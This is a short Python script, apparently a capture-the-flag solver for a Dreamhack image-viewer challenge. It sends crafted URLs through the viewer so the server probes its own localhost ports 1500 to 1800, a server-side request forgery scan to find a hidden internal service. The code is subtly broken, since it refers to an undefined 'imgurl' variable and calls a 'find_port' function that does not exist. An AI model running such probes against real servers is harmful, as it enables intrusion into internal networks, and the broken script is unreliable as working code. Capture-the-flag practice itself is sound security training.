import requests
import sys
from tqdm import tqdm

nof="iVBORw0KG"

def sendimg(iurl):
    global chall_url
    data={"url":imgurl}
    response=requests.post(chall_url, data=data)
    return response.text

def fport():
    for port in tqdm(range(1500,1801)):
        iurl=f"http://Localhost:{port}"
        if nof not in sendimg(iurl):
            print(f"port is {port}")
            break
    return port

if __name__=="__main__":
    chall_port = int(sys.argv[1])
    chall_url = f"http://host1.dreamhack.games:{chall_port}/img_viewer"
    internal_port = find_port()